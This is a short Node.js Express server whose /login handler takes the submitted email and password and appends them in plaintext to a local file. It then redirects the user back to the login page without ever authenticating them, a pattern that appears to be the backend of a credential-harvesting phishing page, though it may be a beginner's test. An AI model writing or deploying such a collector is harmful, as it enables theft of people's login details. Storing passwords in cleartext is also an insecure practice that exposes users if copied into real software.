const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// Serve static files
app.use(express.static('public'));
app.use(bodyParser.urlencoded({ extended: true }));

// File to store login data
const DATA_FILE = `C:\\Users\\jmkkn\\OneDrive\\Documents\\Test\\data\\data.txt`;

// Ensure the file exists
if (!fs.existsSync(DATA_FILE)) {
  fs.writeFileSync(DATA_FILE, '', 'utf-8');
}

// Handle login form submission
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  const entry = `Email: ${email}, Password: ${password}\n`;
  fs.appendFileSync(DATA_FILE, entry, 'utf-8');

  // Redirect back to login page
  res.redirect('/login.html');
});

app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});